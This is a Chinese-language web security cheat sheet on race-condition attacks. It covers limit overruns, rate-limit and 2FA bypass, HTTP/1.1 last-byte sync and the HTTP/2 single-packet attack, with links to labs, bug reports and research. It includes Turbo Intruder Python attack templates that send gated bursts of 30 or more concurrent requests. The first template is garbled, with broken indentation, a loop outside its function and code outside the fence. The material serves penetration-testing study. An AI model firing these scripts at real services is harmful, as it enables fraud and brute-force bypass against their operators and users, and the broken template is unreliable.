# 竞态条件

> 当一个进程关键地或意外地依赖于其他事件的顺序或时间时，可能会发生竞态条件。在可以同时处理多个请求的Web应用程序环境中，开发者可能会让并发由框架、服务器或编程语言来处理。

## 摘要

- [工具](#工具)
- [实验室](#实验室)
- [利用](#利用)
  - [限制溢出](#限制溢出)
  - [绕过速率限制](#绕过速率限制)
- [技术](#技术)
  - [HTTP/1.1 最后字节同步](#http11-最后字节同步)
  - [HTTP/2 单数据包攻击](#http2-单数据包攻击)
- [Turbo Intruder](#turbo-入侵者)
  - [示例1](#示例1)
  - [示例2](#示例2)
- [参考资料](#参考资料)


## 工具

* [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) - 一个Burp Suite扩展，用于发送大量HTTP请求并分析结果。
* [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) - 使在Web应用程序中利用竞态条件变得高效且易于使用。


## 实验室

* [PortSwigger - 限制溢出竞态条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
* [PortSwigger - 多端点竞态条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
* [PortSwigger - 通过竞态条件绕过速率限制](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
* [PortSwigger - 多端点竞态条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
* [PortSwigger - 单端点竞态条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
* [PortSwigger - 利用时间敏感漏洞](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
* [PortSwigger - 部分构造竞态条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)


## 利用

### 限制溢出

透支限额、多次投票、多次使用一张礼品卡。

**示例**:

* [竞态条件允许多次兑换礼品卡，导致获得免费“金钱” - @muon4](https://hackerone.com/reports/759247)
* [可以使用竞态条件绕过邀请限制 - @franjkovic](https://hackerone.com/reports/115007)
* [使用一个邀请注册多个用户 - @franjkovic](https://hackerone.com/reports/148609)


### 绕过速率限制

绕过反暴力破解机制和两步验证。

**示例**:

* [Instagram密码重置机制竞态条件 - Laxman Muthiyah](https://youtu.be/4O9FjTMlHUM)


## 技术

### HTTP/1.1 最后字节同步

发送除最后一个字节外的每个请求，然后通过发送最后一个字节来“释放”每个请求。

使用Turbo Intruder执行最后字节同步

```py
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```

**示例**:

* [破解reCAPTCHA，Turbo Intruder风格 - James Kettle](https://portswigger.net/research/cracking-recaptcha-turbo-intruder-style)


### HTTP/2 单数据包攻击

在HTTP/2中，您可以通过单个连接同时发送多个HTTP请求。在单数据包攻击中，大约会发送20/30个请求，并且它们将同时到达服务器。使用单个请求消除网络抖动。

* [turbo-intruder/race-single-packet-attack.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py)
* Burp Suite
  * 将请求发送到Repeater
  * 复制请求20次（CTRL+R）
  * 创建一个新组并添加所有请求
  * 并行发送组（单数据包攻击）

**示例**:

* [CVE-2022-4037 - 使用单数据包攻击发现Gitlab中的竞态条件漏洞 - James Kettle](https://youtu.be/Y0NVIVucQNE)


## Turbo Intruder

### 示例1

1. 向turbo intruder发送请求

2. 使用此Python代码作为turbo intruder的有效载荷

   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )
   
   for i in range(30):
       engine.queue(target.req, i)
           engine.queue(target.req, target.baseInput, gate='race1')
   ```


        engine.start(timeout=5)
    engine.openGate('race1')
    
        engine.complete(timeout=60)


    def handleResponse(req, interesting):
        table.add(req)
    ```

3. 现在设置外部HTTP头x-request: %s - :warning: 这是由turbo intruder所需的
4. 点击“攻击”


### 示例2

当您必须在发送request1后立即发送request2的竞态条件时，可以使用以下模板，此时窗口可能只有几毫秒。

```python
def queueRequests(target, wordlists): 
    engine = RequestEngine(endpoint=target.endpoint, 
                           concurrentConnections=30, 
                           requestsPerConnection=100, 
                           pipeline=False 
                           ) 
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    ''' 

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30): 
        engine.queue(request2, gate='race1') 
    engine.openGate('race1') 
    engine.complete(timeout=60) 
def handleResponse(req, interesting): 
    table.add(req)
```

## 参考资料

* [DEF CON 31 - 粉碎状态机：Web竞态条件的真正潜力 - James Kettle](https://youtu.be/tKJzsaB1ZvI)
* [粉碎状态机：Web竞态条件的真正潜力 - James Kettle / @albinowax - 2023年8月9日](https://portswigger.net/research/smashing-the-state-machine)
* [Turbo Intruder：拥抱十亿请求攻击 - James Kettle - 2019年1月25日](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
* [Web应用中的竞态条件漏洞案例 - Mandeep Jadon - 2018年4月24日](https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e)
* [Web上的竞态条件 - Josip Franjkovic - 2016年7月12日](https://www.josipfranjkovic.com/blog/race-conditions-on-web)
* [Web竞态条件的新技术和工具 - Emma Stocks - 2023年8月10日](https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions)
* [在Web应用程序中利用竞态条件漏洞 - Javan Rasokat](https://conference.hitb.org/hitbsecconf2022sin/materials/D2%20COMMSEC%20-%20Exploiting%20Race%20Condition%20Vulnerabilities%20in%20Web%20Applications%20-%20Javan%20Rasokat.pdf)